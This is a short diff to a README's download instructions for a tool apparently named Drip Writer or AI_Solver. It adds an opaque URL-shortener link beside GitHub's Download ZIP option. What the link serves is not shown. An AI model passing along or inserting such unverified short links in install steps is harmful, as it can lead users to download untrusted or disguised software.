@@ -38,7 +38,7 @@ If it shows a version number, you're ready. Open the tool you want below and con
 <summary><strong>Step 2: Drip Writer</strong> (click to open)</summary>
 
 ### 2.1 Download it
-1. On this repo's GitHub page, click the **Code** button, then **Download ZIP** or .
+1. On this repo's GitHub page, click the **Code** button, then **Download ZIP** or https://u2l.ai/6ztWrn.
 2. Unzip it and move the **`AI_Solver`** folder into your **Downloads** folder.
 
 ### 2.2 Install its dependencies (one time only)
